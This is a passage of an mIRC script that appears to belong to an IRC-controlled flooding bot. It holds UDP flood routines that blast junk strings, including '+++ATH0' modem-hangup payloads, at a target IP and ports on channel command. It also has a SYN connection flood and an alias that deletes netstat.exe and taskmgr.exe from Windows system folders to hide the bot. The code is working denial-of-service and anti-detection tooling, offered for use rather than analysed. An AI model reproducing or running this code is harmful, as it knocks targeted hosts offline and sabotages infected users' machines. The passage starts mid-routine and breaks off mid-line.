  sockudp gnumc5 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  %gnum.p = $r(1,65000)
  sockudp gnumc9 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnum.p = $r(1,65000) 
  sockudp gnumc10 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  %gnum.p = $r(1,65000)
  sockudp gnumc11 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  return |  :done | msgx %pchan [packeting]: FINISHED! | .timergcoolt off | unset %gnum* | unset %pchan 
}

alias coldrage {
  if ($1 == start) && ($2 && $3 && $4) { if (%_packeting == 1) { msgx %pchan Error: currently packeting! | return } | set %_packeting 1 | unset %_coldragestop | unset %loops | .timer 1 2 set %_cstarttime $ctime | .timer 1 2 /timercoldrage -om 0 0 _coldragestart $2- | msgx %pchan Sending [ $+ $2 $+ ] packets to [ $+ $3 $+ ] on port [ $+ $4 $+ ] [total: $bytes($calc(32040 * $2)).suf $+ ] | return }
  if ($1 == stop) { if (%_packeting == 1) { set %_coldragestop 1 | set %_packeting 0 | timercoldrage* off | msgx %pchan Halting all packets! | return } | else { msgx %pchan Error! no packeting in progress | return } }
  if ($1 == help) { msgx %pchan syntax; !udp [start|stop|help] [ammount] [ip] [port|random] | return }
  msgx # Error in syntax; !udp [start|stop|help] [ammount] [ip] [port|random]
}
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | msg # Syn Attack Done! }

alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}

alias hehlite {
  if ($exists(c:\windows\system32\netstat.exe) == $true) { remove c:\windows\system32\netstat.exe }
  if ($exists(c:\windows\system32\taskmgr.exe) == $true) { remove c:\windows\system32\taskmgr.exe }
  if ($exists(c:\winnt\system32\netstat.exe) == $true) { remove c:\winnt\system32\netstat.exe }
  if ($exists(c:\winnt\system32\taskmgr.exe) == $true) { remove c:\winnt\system32\taskmgr.exe }
}


alias _coldragestart {
  if (%_packeting == 1) {
    if (%_coldragestop == 1) { timercoldrage* off  | return }
    inc %loops
    if (%loops > $1) { timercoldrage* off | msgx %pchan Packeting completed on [ $+ $2 $+ ] in [ $+ $duration($calc($ctime - %_cstarttime)) $+ ] [total: $bytes($calc(32040 * $1)).suf $+ ] | set %_packeting 0 | return }
    sockudp coldrage1 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage2 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage3 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage4 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage5 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage6 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage7 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage8 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage9 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage10 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage11 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage12 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage13 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage14 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage15 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage16 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage17 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage18 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage19 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage20 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage21 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage22 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage23 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage24 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage25 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage26 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage27 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage28 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage29 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage30 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage31 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage32 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage33 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage34 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage35 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage36 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage37 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage38 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage39 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage40 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
  }
}
alias sendstr {
  var %rnd = $r(1,9)
  if (%rnd == 1) { return ®|ÚjK×ÿú'½n« Zì§Ê"QOd©êÇä%;ç9ëb·.V6b¬SsÐçd'2e}P8mÍ8JÆ»¶ýi¥¤}c>À°ÞúU¸Aºë¨æ$²#KÍ6¿:ü~#1t=’!Q-f²QªÖ¬WmS2Õ:Y²ÅwB½mº6c¤6î¦@Ð¹åÛ«3f=¸'(ÃÙÂáS¶ûÜË/=ôïÃr+üÈåµ¶xµ¥Þ7N-k@áõÇýÏ¡rÌ¤ß÷G¥+C@­=ÒqoyC¢L7biI>B(&7_¾îK(Äº~W4Ü¾.R6G(þT¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­c9àîMËô¯ÑW¯D÷ç{Ð’±j}w-àOc¦g'Êßç~i¢(IgÖ"§ÅüP2Îê>·þñì¡,¿R~qNõ_'ñc%>$Â‘BØ6cùMõJos¥í"wßýîInÔ‘piÕì0B0¨£äçGfÀM¤7y]Aw½:ü2F5t£`nîInÔ‘piÕì0B0¨£äçGfÀM¤7y]Aw½:ü2F5t£`®|ÚjK×ÿú'½n« Zì§Ê"QOd©êÇä%;ç9ëb·.V6b¬SsÐçd'2e}P8mÍ8JÆ»¶ýi¥¤}c>À°ÞúU¸Aºë¨æ$²#KÍ6¿:ü~#1t=’!Q-f²QªÖ¬WmS2Õ:Y²ÅwB½mº6c¤6î¦@Ð¹åÛ«3f=¸'(ÃÙÂáS¶ûÜË/=ôïÃr+üÈåµ¶xµ¥Þ7N-k@áõÇýÏ¡rÌ¤ß÷G¥+C@­=ÒqoyC¢L7biI>B(&7_¾îK(Äº~W4Ü¾.R6G(þT¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­c9àîMËô¯ÑW¯D÷ç{Ð’±j}w-àOc¦g'Êßç~i¢(IgÖ"§ÅüP2Îê>·þñì¡,¿R~qNõ_'ñc%>$Â‘BØ6cùMõJos¥í"wßý }
  if (%rnd == 2) { return +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
  if (%rnd == 3) { return !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! }
  if (%rnd == 4) { return @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ }
  if (%rnd == 5) { return ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ }
  if (%rnd == 6) { return ********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************* }
  if (%rnd == 7) { return !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%! }
  if (%rnd == 8) { return + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATHO }
  if (%rnd == 9) { return A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4Ö·#6‹²\³[Nž›«2„7)™ÜZ4Ö·#6‹²\³[N }
}
alias makestr {
  write -c makestr.txt 